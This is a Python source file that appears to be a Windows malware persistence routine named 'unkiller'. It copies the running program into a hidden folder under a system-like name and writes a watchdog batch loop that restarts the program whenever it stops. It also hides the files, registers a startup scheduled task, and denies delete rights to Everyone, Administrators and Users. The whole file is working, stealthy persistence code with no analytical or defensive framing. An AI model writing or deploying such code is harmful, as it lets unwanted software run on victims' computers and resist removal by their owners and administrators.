import os
import psutil
import sys
import subprocess
import shutil

def unkiller():
    exe_path = sys.executable
    if os.path.basename(exe_path).lower() == "systemservice92.exe":
        return
    target_dir = os.path.join("C:\\", "$Sys-Manager" * 1)
    target_executable = os.path.join(target_dir, "systemservice92.exe")
    bat_file_path = os.path.join(target_dir, "systemservice.bat")
    folder_path = os.path.dirname(target_executable)
    
    if os.path.exists(target_executable) and os.path.exists(bat_file_path):
        try:
            subprocess.Popen(bat_file_path, creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
        except Exception:
            pass
        return
    
    try:
        os.makedirs(folder_path, exist_ok=True)
        shutil.copy(exe_path, target_executable)
    except Exception:
        pass
    
    bat_content = f'''@echo off
:loop
tasklist /FI "IMAGENAME eq systemservice92.exe" 2>NUL | find /I "systemservice92.exe" >NUL
if %ERRORLEVEL% NEQ 0 (
 start "" "{target_executable}"
)
timeout /t 1 >nul
goto loop
'''
    try:
        with open(bat_file_path, 'w') as bat_file:
            bat_file.write(bat_content)
    except Exception:
        pass
    
    try:
        subprocess.Popen(bat_file_path, creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
    except Exception:
        pass
    
    try:
        subprocess.Popen(f'attrib +h "{target_executable}"', creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
    except Exception:
        pass
    
    try:
        subprocess.Popen(f'attrib +h "{bat_file_path}"', creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
    except Exception:
        pass
    
    try:
        subprocess.Popen(f'attrib +h "{folder_path}"', creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
    except Exception:
        pass
    
    try:
        subprocess.run(['schtasks', '/create', '/tn', 'servicebat', '/tr', bat_file_path, '/sc', 'onstart', '/f'], check=True)
    except subprocess.CalledProcessError:
        pass
    
    try:
        subprocess.run(f'icacls "{target_dir}" /deny *S-1-1-0:(D)', shell=True, check=True)
        subprocess.run(f'icacls "{target_dir}" /deny *S-1-5-32-544:(D)', shell=True, check=True)
        subprocess.run(f'icacls "{target_dir}" /deny *S-1-5-32-545:(D)', shell=True, check=True)
    except Exception:
        pass
    
    try:
        desktop_ini_path = os.path.join(target_dir, 'desktop.ini')
        with open(desktop_ini_path, 'w') as f:
            f.write('[.ShellClassInfo]\nIconResource=%windir%\\System32\\shell32.dll,0\n')
        subprocess.Popen(f'attrib +h "{desktop_ini_path}"', creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
    except Exception:
        pass
    
    desktop_ini_path = os.path.join(target_dir, "desktop.ini")
    if not os.path.exists(desktop_ini_path):
        with open(desktop_ini_path, "w") as ini_file:
            ini_file.write(
                "[.ShellClassInfo]\n"
                "IconFile=C:\\Windows\\System32\\shell32.dll\n"
                "IconIndex=-1\n"
            )
        os.system(f"attrib +h +s \"{desktop_ini_path}\"")
        os.system(f"attrib +h +s \"{target_dir}\"")